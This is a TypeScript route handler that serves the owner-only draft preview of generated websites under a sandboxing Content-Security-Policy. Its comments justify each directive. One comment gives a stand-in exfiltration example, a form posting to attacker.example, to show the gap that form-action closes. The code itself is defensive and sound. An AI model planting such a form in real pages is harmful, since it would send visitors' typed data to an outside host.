import { db } from "@/lib/db";
import { getCurrentUser } from "@/lib/auth";

export const dynamic = "force-dynamic";

const MIME: Record<string, string> = {
  html: "text/html; charset=utf-8",
  css: "text/css; charset=utf-8",
  js: "text/javascript; charset=utf-8",
  map: "application/json",
  json: "application/json",
  svg: "image/svg+xml",
  txt: "text/plain; charset=utf-8",
  woff2: "font/woff2",
};

// MUST stay byte-identical to SANDBOX_CSP in app/api/site/[slug]/[[...path]]/route.ts.
// Duplicated rather than shared because these are two independent request
// entrypoints; if you change one, change the other.
//
// form-action / base-uri / object-src are here because NONE of them fall back
// to default-src. `connect-src 'none'` was long assumed to mean "a generated
// site cannot reach the outside world", but it only ever covered SCRIPTED
// requests — a plain <form action="https://attacker.example"> would have
// submitted cross-origin with whatever a visitor typed into it.
//
// UNCHANGED BY FORM SUBMISSIONS. Generated sites can now have working contact
// forms (lib/site-forms.ts): the page POSTs to `/__forms/<name>` on ITS OWN
// origin, which on the sites domain is already us, because proxy.ts rewrites
// that host into app/api/site/[slug]/[[...path]]/route.ts. `form-action 'self'`
// permits a same-origin POST as written, so neither copy of this constant had
// to be widened by a character — see the longer argument in the site route.
// `connect-src 'none'` in particular is untouched: a form POST is a navigation,
// not a scripted request.
//
// DISPUTED — do not rely on either model without re-measuring.
//
// PreviewFrame.tsx loads this in an iframe sandboxed WITHOUT allow-same-origin,
// so the document sits in an opaque origin. One agent concluded that makes
// `'self'` match nothing, i.e. `form-action 'self'` behaves as `'none'` here.
// A second agent, driving real headless Chrome over CDP, measured the opposite:
// `'self'` resolving to the serving origin and the policy working as written.
//
// They may have been measuring different setups — the preview is now delivered
// via `srcdoc` rather than `src` (see PreviewFrame.tsx), which changes how the
// document's origin is established. Nobody has re-run the original case since.
//
// The practical impact is nil either way: a form in the DRAFT preview does
// nothing when submitted, because form submissions are only wired for PUBLISHED
// sites (lib/site-forms.ts). Recorded here so the next person measures rather
// than inherits a confident-sounding mechanism that may be wrong.
// Left that way deliberately rather than naming an origin here to re-enable it.
// A draft is unpublished work; a submission from it would either land in the
// owner's real inbox as a fake enquiry, or need a second, unpublished code path
// to discard — and the only way to allow it would be to widen form-action on
// the editor's own origin, which is the app itself. The form is tested on the
// live site after publishing. If this is ever revisited, the change belongs in
// BOTH copies of the constant or they have silently diverged.
const SANDBOX_CSP =
  "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'none'; object-src 'none'";

// Serves the DRAFT tree for the live in-editor preview. Owner-only — this is
// unpublished work, not a public site.
export async function GET(
  _req: Request,
  { params }: { params: Promise<{ id: string; path?: string[] }> },
) {
  const user = await getCurrentUser();
  if (!user) return new Response("Not signed in.", { status: 401 });

  const { id, path } = await params;
  const project = await db.project.findFirst({ where: { id, userId: user.id } });
  if (!project) return new Response("Not found.", { status: 404 });

  const filePath = path && path.length > 0 ? path.join("/") : "index.html";
  const file = await db.projectFile.findFirst({
    where: { projectId: id, path: filePath, published: false, kind: "build" },
  });
  if (!file) {
    return new Response(
      filePath === "index.html"
        ? "<!doctype html><html><body style='font:14px sans-serif;color:#888;display:grid;place-items:center;height:100vh'>Nothing built yet — describe what you want on the left.</body></html>"
        : "Not found.",
      { status: filePath === "index.html" ? 200 : 404, headers: { "Content-Type": "text/html; charset=utf-8" } },
    );
  }

  const ext = filePath.split(".").pop() ?? "";
  // .woff2 travels as base64 through this whole pipeline (lib/build-site.ts)
  // since every ProjectFile.content column is text — decode it back to real
  // bytes here, same as the published-site route does.
  const body = ext === "woff2" ? Buffer.from(file.content, "base64") : file.content;
  return new Response(body, {
    headers: {
      "Content-Type": MIME[ext] ?? "application/octet-stream",
      "Content-Security-Policy": SANDBOX_CSP,
      "Cache-Control": "no-store",
    },
  });
}
